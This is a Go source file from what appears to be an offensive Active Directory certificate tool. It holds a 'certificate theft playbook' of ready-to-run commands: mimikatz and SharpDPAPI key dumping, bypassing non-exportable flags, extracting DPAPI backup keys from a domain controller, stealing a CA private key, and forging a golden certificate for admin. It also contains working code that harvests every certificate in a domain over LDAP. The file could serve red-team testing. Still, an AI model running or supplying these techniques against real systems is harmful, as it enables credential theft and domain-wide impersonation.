package pki

import (
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// CertTheftMethod describes a certificate theft technique.
type CertTheftMethod struct {
	Name        string
	Description string
	Tool        string
	Commands    []string
	Notes       string
}

// GetCertTheftMethods returns all supported certificate theft techniques.
func GetCertTheftMethods() []CertTheftMethod {
	return []CertTheftMethod{
		{
			Name:        "THEFT1 — Export via Windows Crypto API",
			Description: "Export user/machine certificates from the Windows certificate store when the private key is marked as exportable.",
			Tool:        "certutil / PowerShell / mimikatz",
			Commands: []string{
				"# List user certificates",
				"certutil -user -store My",
				"# Export with private key (if exportable)",
				"certutil -user -exportPFX My <thumbprint> cert.pfx",
				"# PowerShell equivalent",
				"Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath cert.pfx -Password (ConvertTo-SecureString -String 'pass' -Force -AsPlainText)",
				"# mimikatz (bypasses non-exportable flag via crypto::capi)",
				"mimikatz # crypto::capi",
				"mimikatz # crypto::certificates /export /store:MY",
			},
			Notes:     "Windows-local technique. Requires access to the user's session. Run from the target host.",
		},
		{
			Name:        "THEFT2 — DPAPI Machine Certificate Extraction",
			Description: "Extract machine certificates protected by DPAPI from the local machine store. Requires local admin.",
			Tool:        "SharpDPAPI / mimikatz",
			Commands: []string{
				"# SharpDPAPI — dump machine certificates",
				"SharpDPAPI.exe certificates /machine",
				"# mimikatz equivalent",
				"mimikatz # crypto::certificates /export /store:CERT_SYSTEM_STORE_LOCAL_MACHINE /systemstore:MY",
				"# With DPAPI masterkey backup",
				"mimikatz # lsadump::backupkeys /system:dc01.corp.local /export",
				"SharpDPAPI.exe certificates /machine /mkfile:backup.key",
			},
			Notes:     "Windows-local technique. Requires local administrator. DPAPI backup key from DC decrypts all machine certs.",
		},
		{
			Name:        "THEFT3 — DPAPI User Certificate Extraction",
			Description: "Extract user certificates protected by DPAPI. Requires the user's password or DPAPI masterkey.",
			Tool:        "SharpDPAPI / mimikatz",
			Commands: []string{
				"# SharpDPAPI with user password",
				"SharpDPAPI.exe certificates /password:UserPass123",
				"# SharpDPAPI with DPAPI backup key (domain-wide)",
				"SharpDPAPI.exe certificates /mkfile:domain_backup.key",
				"# mimikatz",
				"mimikatz # dpapi::capi /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\<SID>\\<container>\"",
			},
			Notes:     "Windows-local technique. User DPAPI masterkeys are derived from the user's password.",
		},
		{
			Name:        "THEFT4 — LDAP Certificate Extraction",
			Description: "Extract userCertificate attributes from Active Directory via LDAP. Retrieves all certificates stored in AD user/computer objects.",
			Tool:        "certstrike (built-in)",
			Commands: []string{
				"# Extract all user certificates from AD",
				"certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass",
				"# Extract with LDAPS",
				"certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass --ldaps",
			},
			Notes:     "Automated: CertStrike queries LDAP for userCertificate attributes and exports DER X.509 certs as PEM files.",
		},
		{
			Name:        "THEFT5 — CA Private Key Extraction",
			Description: "Extract the Certificate Authority's private key for golden certificate attacks. Requires admin on the CA server.",
			Tool:        "SharpDPAPI / mimikatz / certsrv.msc",
			Commands: []string{
				"# certutil backup (requires CA admin)",
				"certutil -backupKey C:\\temp\\ca-backup",
				"# mimikatz CA key extraction",
				"mimikatz # crypto::scauth /caname:\"corp-DC01-CA\" /keyexport",
				"# SharpDPAPI",
				"SharpDPAPI.exe certificates /machine",
				"# Then use extracted CA key for golden cert:",
				"certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt",
			},
			Notes:     "Windows-local technique. The CA private key enables forging ANY certificate trusted by the domain.",
		},
	}
}

// PrintCertTheftPlaybook prints a step-by-step guide for certificate theft.
func PrintCertTheftPlaybook(method string) {
	methods := GetCertTheftMethods()

	if method == "" || method == "all" {
		fmt.Println("[+] Certificate Theft Playbook — All Techniques")
		for _, m := range methods {
			printMethod(m)
		}
		return
	}

	for _, m := range methods {
		if containsIgnoreCase(m.Name, method) {
			printMethod(m)
			return
		}
	}

	fmt.Printf("[!] Unknown method: %s\n", method)
	fmt.Println("[*] Available methods:")
	for _, m := range methods {
		fmt.Printf("    - %s\n", m.Name)
	}
}

func printMethod(m CertTheftMethod) {
	fmt.Printf("━━━ %s ━━━\n", m.Name)
	fmt.Printf("    %s\n", m.Description)
	fmt.Printf("    Tools: %s\n\n", m.Tool)
	for _, cmd := range m.Commands {
		fmt.Printf("    %s\n", cmd)
	}
	fmt.Printf("\n    Note: %s\n\n", m.Notes)
}

// ────────────────────────────────────────────────────────────────────────────
// THEFT4 — Real LDAP Certificate Extraction
// ────────────────────────────────────────────────────────────────────────────

// ExtractUserCertificatesLDAP queries Active Directory for userCertificate
// attributes on all user and computer objects, parses the DER-encoded X.509
// certificates, and writes them as PEM files to the output directory.
//
// This is the real implementation of THEFT4 — it actually connects to LDAP
// and extracts certificates, rather than printing guidance commands.
func ExtractUserCertificatesLDAP(cfg *ADCSConfig, outputDir string) (int, error) {
	fmt.Println("[*] THEFT4: Extracting userCertificate attributes from AD via LDAP...")

	conn, err := connectLDAP(cfg)
	if err != nil {
		return 0, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	// Build base DN from domain
	parts := strings.Split(cfg.Domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	baseDN := strings.Join(dcParts, ",")

	// Search for all objects with userCertificate attribute
	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false,
		"(userCertificate=*)",
		[]string{"sAMAccountName", "distinguishedName", "userCertificate", "objectClass"},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 100)
	if err != nil {
		return 0, fmt.Errorf("LDAP search for userCertificate: %w", err)
	}

	if len(result.Entries) == 0 {
		fmt.Println("[*] No objects with userCertificate attribute found")
		return 0, nil
	}

	fmt.Printf("[+] Found %d object(s) with certificates\n", len(result.Entries))

	if err := os.MkdirAll(outputDir, 0700); err != nil {
		return 0, fmt.Errorf("create output dir: %w", err)
	}

	totalCerts := 0
	for _, entry := range result.Entries {
		sam := entry.GetAttributeValue("sAMAccountName")
		if sam == "" {
			sam = "unknown"
		}

		// userCertificate is a multi-valued binary attribute
		certValues := entry.GetRawAttributeValues("userCertificate")
		if len(certValues) == 0 {
			continue
		}

		for i, certDER := range certValues {
			cert, err := x509.ParseCertificate(certDER)
			if err != nil {
				fmt.Printf("[!] %s: certificate %d parse error: %v\n", sam, i, err)
				continue
			}

			// Write as PEM
			safeName := strings.ReplaceAll(sam, " ", "_")
			safeName = strings.ReplaceAll(safeName, "/", "_")
			fileName := fmt.Sprintf("%s_cert%d.pem", safeName, i)
			pemPath := filepath.Join(outputDir, fileName)

			pemFile, err := os.Create(pemPath)
			if err != nil {
				fmt.Printf("[!] %s: create file %s: %v\n", sam, pemPath, err)
				continue
			}

			if err := pem.Encode(pemFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
				pemFile.Close()
				fmt.Printf("[!] %s: write PEM: %v\n", sam, err)
				continue
			}
			pemFile.Close()

			totalCerts++
			fmt.Printf("[+] %s: CN=%s, Issuer=%s, Expires=%s → %s\n",
				sam,
				cert.Subject.CommonName,
				cert.Issuer.CommonName,
				cert.NotAfter.Format("2006-01-02"),
				pemPath,
			)

			// Check for interesting EKUs
			for _, eku := range cert.ExtKeyUsage {
				switch eku {
				case x509.ExtKeyUsageClientAuth:
					fmt.Printf("    ⚠ Has Client Authentication EKU — usable for Kerberos PKINIT\n")
				}
			}
		}
	}

	fmt.Printf("\n[+] THEFT4 complete: extracted %d certificate(s) from %d object(s) → %s\n",
		totalCerts, len(result.Entries), outputDir)
	return totalCerts, nil
}

// ────────────────────────────────────────────────────────────────────────────
// Helpers
// ────────────────────────────────────────────────────────────────────────────

func containsIgnoreCase(s, substr string) bool {
	return indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	sl := len(substr)
	for i := 0; i <= len(s)-sl; i++ {
		match := true
		for j := 0; j < sl; j++ {
			a, b := s[i+j], substr[j]
			if a >= 'A' && a <= 'Z' {
				a += 32
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			if a != b {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}
